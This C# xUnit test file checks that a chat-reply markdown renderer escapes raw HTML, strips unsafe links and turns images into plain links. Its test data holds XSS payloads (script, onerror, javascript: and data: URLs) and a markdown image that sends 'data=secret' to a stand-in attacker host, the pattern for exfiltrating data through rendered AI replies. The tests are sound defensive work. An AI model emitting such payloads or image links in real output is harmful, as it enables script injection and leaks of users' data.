using Djohnnie.SoftwareFactory.Web.Components.Shared;

namespace Djohnnie.SoftwareFactory.Web.Tests;

public class ChatMarkdownTests
{
    [Fact]
    public void ToHtml_RendersMarkdown()
    {
        var html = ChatMarkdown.ToHtml("**Done.** I changed:\n\n- the `title`\n- the description");

        Assert.Contains("<strong>Done.</strong>", html);
        Assert.Contains("<li>the <code>title</code></li>", html);
    }

    [Theory]
    [InlineData("<script>alert(1)</script>")]
    [InlineData("<img src=x onerror=alert(1)>")]
    [InlineData("Hi <a href=\"javascript:alert(1)\">there</a>")]
    public void ToHtml_EscapesRawHtml(string markdown)
    {
        var html = ChatMarkdown.ToHtml(markdown);

        Assert.DoesNotContain("<script", html);
        Assert.DoesNotContain("<img", html);
        Assert.DoesNotContain("<a ", html);
        Assert.Contains("&lt;", html);
    }

    [Theory]
    [InlineData("[click](javascript:alert(1))", "click")]
    [InlineData("[data](data:text/html;base64,PHNjcmlwdD4=)", "data")]
    [InlineData("<javascript:alert(1)>", "javascript:alert(1)")]
    public void ToHtml_KeepsTheTextOfUnsafeLinks(string markdown, string text)
    {
        var html = ChatMarkdown.ToHtml(markdown);

        Assert.DoesNotContain("href", html);
        Assert.Contains(text, html);
    }

    [Fact]
    public void ToHtml_OpensSafeLinksInANewTabWithoutReferrer()
    {
        var html = ChatMarkdown.ToHtml("See [the docs](https://docs.github.com/copilot) or https://github.com.");

        Assert.Contains("href=\"https://docs.github.com/copilot\"", html);
        Assert.Contains("href=\"https://github.com\"", html);
        Assert.Equal(2, html.Split("target=\"_blank\"").Length - 1);
        Assert.Equal(2, html.Split("rel=\"noopener noreferrer nofollow\"").Length - 1);
    }

    [Fact]
    public void ToHtml_TurnsImagesIntoLinks_SoRepliesCantLoadUrls()
    {
        var html = ChatMarkdown.ToHtml("![diagram](https://attacker.test/pixel.png?data=secret) ![](https://attacker.test/x.png)");

        Assert.DoesNotContain("<img", html);
        Assert.Contains(">diagram</a>", html);
        Assert.Contains(">https://attacker.test/x.png</a>", html);
    }
}
